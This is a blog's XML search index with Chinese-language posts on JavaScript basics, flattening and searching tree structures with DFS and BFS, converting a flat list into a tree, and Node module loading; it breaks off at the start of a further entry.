<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>经典题目</title>
      <link href="/2022/06/27/lesson1/"/>
      <url>/2022/06/27/lesson1/</url>
      
        <content type="html"><![CDATA[<h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><h4 id="JavaScript-是一种弱类型脚本语言，所谓弱类型指的是定义变量时，不需要什么类型，在程序运行过程中会自动判断类型。"><a href="#JavaScript-是一种弱类型脚本语言，所谓弱类型指的是定义变量时，不需要什么类型，在程序运行过程中会自动判断类型。" class="headerlink" title="JavaScript 是一种弱类型脚本语言，所谓弱类型指的是定义变量时，不需要什么类型，在程序运行过程中会自动判断类型。"></a>JavaScript 是一种弱类型脚本语言，所谓弱类型指的是定义变量时，不需要什么类型，在程序运行过程中会自动判断类型。</h4><h4 id="ECMAScript-中定义了-6-种原始类型："><a href="#ECMAScript-中定义了-6-种原始类型：" class="headerlink" title="ECMAScript 中定义了 6 种原始类型："></a>ECMAScript 中定义了 6 种原始类型：</h4><ul><li>Boolean</li><li>String</li><li>Number</li><li>Null</li><li>Undefined</li><li>Symbol（ES6 新定义）<br>注意：原始类型不包含 Object。</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树型结构转一维List</title>
      <link href="/2022/05/12/tree-to-list/"/>
      <url>/2022/05/12/tree-to-list/</url>
      
        <content type="html"><![CDATA[<h3 id="树形结构转一维-list"><a href="#树形结构转一维-list" class="headerlink" title="树形结构转一维 list"></a>树形结构转一维 list</h3><h4 id="原始数据"><a href="#原始数据" class="headerlink" title="原始数据"></a>原始数据</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;a1&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;a11&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;a12&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;a2&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;a21&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;a22&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;a3&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;a31&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;a32&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;b&quot;</span>,</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;b1&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;b11&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;b12&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;b2&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;b21&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;b22&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;b3&quot;</span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;b31&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;b32&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="深度优先拍平数据递归"><a href="#深度优先拍平数据递归" class="headerlink" title="深度优先拍平数据递归"></a>深度优先拍平数据<code>递归</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 深度优先拍平数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">list</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleExpendDFS</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">list</span>) &#123;</span><br><span class="line">    list.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">      result.<span class="title function_">push</span>(item);</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="property">children</span>) &#123;</span><br><span class="line">        <span class="title function_">fn</span>(item.<span class="property">children</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">fn</span>(list);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="深度优先拍平数据（非递归）利用stack先进后出的特性"><a href="#深度优先拍平数据（非递归）利用stack先进后出的特性" class="headerlink" title="深度优先拍平数据（非递归）利用stack先进后出的特性"></a>深度优先拍平数据（非递归）<code>利用stack先进后出的特性</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 深度优先拍平数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">list</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleExpendDFS1</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> result = [];</span><br><span class="line">  <span class="keyword">let</span> satck = [...list];</span><br><span class="line">  <span class="keyword">while</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(satck) &amp;&amp; satck.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> item = satck.<span class="title function_">pop</span>();</span><br><span class="line">    result.<span class="title function_">push</span>(item);</span><br><span class="line">    <span class="keyword">if</span> (item.<span class="property">children</span>) &#123;</span><br><span class="line">      satck.<span class="title function_">push</span>(...item.<span class="property">children</span>)</span><br><span class="line">      <span class="comment">// for (let i = 0; i &lt; item.children.length; i++) &#123;</span></span><br><span class="line">      <span class="comment">//   const ele = item.children[i];</span></span><br><span class="line">      <span class="comment">//   satck.push(ele);</span></span><br><span class="line">      <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="广度优先拍平数据-利用queue先进先出的特性"><a href="#广度优先拍平数据-利用queue先进先出的特性" class="headerlink" title="广度优先拍平数据 利用queue先进先出的特性"></a>广度优先拍平数据 <code>利用queue先进先出的特性</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 广度优先拍平数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">list</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleExpendBFS</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">let</span> queue = [...list];</span><br><span class="line">  <span class="keyword">while</span> (queue.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> item = queue.<span class="title function_">shift</span>();</span><br><span class="line">    result.<span class="title function_">push</span>(item);</span><br><span class="line">    <span class="keyword">if</span> (item.<span class="property">children</span>) &#123;</span><br><span class="line">      queue.<span class="title function_">push</span>(...item.<span class="property">children</span>)</span><br><span class="line">      <span class="comment">// item.children.forEach(k=&gt; &#123;</span></span><br><span class="line">      <span class="comment">//   queue.push(k)</span></span><br><span class="line">      <span class="comment">// &#125;)</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="如何在树形结构中查找指定数据-？"><a href="#如何在树形结构中查找指定数据-？" class="headerlink" title="如何在树形结构中查找指定数据 ？"></a>如何在树形结构中查找指定数据 ？</h3><h4 id="深度优先搜索算法递归"><a href="#深度优先搜索算法递归" class="headerlink" title="深度优先搜索算法递归"></a>深度优先搜索算法<code>递归</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归实现深度优先搜索算法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">list</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">name</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleDFS</span> = (<span class="params">list, name</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> hasFound = <span class="literal">false</span>,</span><br><span class="line">    target;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">list, name</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(list) &amp;&amp; !hasFound) &#123;</span><br><span class="line">      list.<span class="title function_">forEach</span>(<span class="function">(<span class="params">i</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i.<span class="property">name</span> === name) &#123;</span><br><span class="line">          hasFound = <span class="literal">true</span>;</span><br><span class="line">          target = i;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i.<span class="property">children</span>) &#123;</span><br><span class="line">          <span class="title function_">fn</span>(i.<span class="property">children</span>, name);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">fn</span>(list, name);</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="广度优先遍历实现搜索算法-利用queue先进先出的特性"><a href="#广度优先遍历实现搜索算法-利用queue先进先出的特性" class="headerlink" title="广度优先遍历实现搜索算法 利用queue先进先出的特性"></a>广度优先遍历实现搜索算法 <code>利用queue先进先出的特性</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 广度优先遍历实现搜索算法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">list</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">name</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleBFS</span> = (<span class="params">list, name</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> result;</span><br><span class="line">  <span class="keyword">let</span> queue = list;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(queue)) &#123;</span><br><span class="line">    <span class="keyword">while</span> (queue.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> item = queue.<span class="title function_">shift</span>();</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="property">name</span> === name) &#123;</span><br><span class="line">        result = item;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (item.<span class="property">children</span>) &#123;</span><br><span class="line">        item.<span class="property">children</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">i</span>) =&gt;</span> &#123;</span><br><span class="line">          queue.<span class="title function_">push</span>(i);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> tree </tag>
            
            <tag> dfs </tag>
            
            <tag> bfs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一维List转树形结构</title>
      <link href="/2022/05/05/list-to-tree/"/>
      <url>/2022/05/05/list-to-tree/</url>
      
        <content type="html"><![CDATA[<h3 id="一维-list-生成树行结构"><a href="#一维-list-生成树行结构" class="headerlink" title="一维 list 生成树行结构"></a>一维 list 生成树行结构</h3><h4 id="原始数据"><a href="#原始数据" class="headerlink" title="原始数据"></a>原始数据</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> datas = [</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">0</span>, <span class="attr">parentId</span>: <span class="literal">null</span>, <span class="attr">name</span>: <span class="string">&quot;一级菜单A&quot;</span>, <span class="attr">rank</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">parentId</span>: <span class="number">0</span>, <span class="attr">name</span>: <span class="string">&quot;一级菜单A&quot;</span>, <span class="attr">rank</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">parentId</span>: <span class="number">0</span>, <span class="attr">name</span>: <span class="string">&quot;一级菜单B&quot;</span>, <span class="attr">rank</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">parentId</span>: <span class="number">0</span>, <span class="attr">name</span>: <span class="string">&quot;一级菜单C&quot;</span>, <span class="attr">rank</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">4</span>, <span class="attr">parentId</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;二级菜单A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">5</span>, <span class="attr">parentId</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;二级菜单A-B&quot;</span>, <span class="attr">rank</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">6</span>, <span class="attr">parentId</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&quot;二级菜单B-A&quot;</span>, <span class="attr">rank</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">7</span>, <span class="attr">parentId</span>: <span class="number">4</span>, <span class="attr">name</span>: <span class="string">&quot;三级菜单A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">3</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">8</span>, <span class="attr">parentId</span>: <span class="number">7</span>, <span class="attr">name</span>: <span class="string">&quot;四级菜单A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">4</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">9</span>, <span class="attr">parentId</span>: <span class="number">8</span>, <span class="attr">name</span>: <span class="string">&quot;五级菜单A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">10</span>, <span class="attr">parentId</span>: <span class="number">9</span>, <span class="attr">name</span>: <span class="string">&quot;六级菜单A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">6</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">11</span>, <span class="attr">parentId</span>: <span class="number">10</span>, <span class="attr">name</span>: <span class="string">&quot;七级菜单A-A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">7</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">12</span>, <span class="attr">parentId</span>: <span class="number">11</span>, <span class="attr">name</span>: <span class="string">&quot;八级菜单A-A-A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">8</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">13</span>, <span class="attr">parentId</span>: <span class="number">12</span>, <span class="attr">name</span>: <span class="string">&quot;九级菜单A-A-A-A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">9</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">14</span>, <span class="attr">parentId</span>: <span class="number">13</span>, <span class="attr">name</span>: <span class="string">&quot;十级菜单A-A-A-A-A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">10</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="递归形式转换"><a href="#递归形式转换" class="headerlink" title="递归形式转换"></a>递归形式转换</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">toTree</span> = (<span class="params">arr = [], parentId</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> array = []</span><br><span class="line">    arr.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (item.<span class="property">parentId</span> === parentId) &#123;</span><br><span class="line">            item.<span class="property">children</span> = <span class="title function_">toTree</span>(arr, item.<span class="property">id</span>)</span><br><span class="line">            array.<span class="title function_">push</span>(item)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> array</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="对象引用遍历实现"><a href="#对象引用遍历实现" class="headerlink" title="对象引用遍历实现"></a>对象引用遍历实现</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对象引用遍历实现</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">list</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">toTree</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> result = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> map = &#123;&#125;;</span><br><span class="line">  list.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    map[item.<span class="property">id</span>] = item;</span><br><span class="line">  &#125;);</span><br><span class="line">  list.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> parent = map[item.<span class="property">parentId</span>];</span><br><span class="line">    <span class="keyword">if</span> (parent) &#123;</span><br><span class="line">      (parent.<span class="property">children</span> || (parent.<span class="property">children</span> = [])).<span class="title function_">push</span>(item);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.<span class="title function_">push</span>(item);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> tree </tag>
            
            <tag> object-reference </tag>
            
            <tag> list </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node模块机制</title>
      <link href="/2022/04/26/node-module/"/>
      <url>/2022/04/26/node-module/</url>
      
        <content type="html"><![CDATA[<h3 id="node-模块"><a href="#node-模块" class="headerlink" title="node 模块"></a>node 模块</h3><h4 id="核心模块"><a href="#核心模块" class="headerlink" title="核心模块"></a>核心模块</h4><p>核心模块部分在 Node 源代码的编译过程中，编译进了二进制执行文 件。在Node 进程启动时，部分核心模块就被直接加载进内存中，所以这部分核心模块引入时，文件定位和编译执行这两个步骤可以省略掉，并且在路径分析中优先判断，所以它的加载速度是最快的。</p><h4 id="文件模块"><a href="#文件模块" class="headerlink" title="文件模块"></a>文件模块</h4><p>文件模块则是在运行时动态加载，需要完整的路径分析、文件定位、编译执行过程，速度比核心模块慢。</p>]]></content>
      
      
      <categories>
          
          <category> BackEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> modules </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript运行原理(三)</title>
      <link href="/2022/03/15/js-runtime3/"/>
      <url>/2022/03/15/js-runtime3/</url>
      
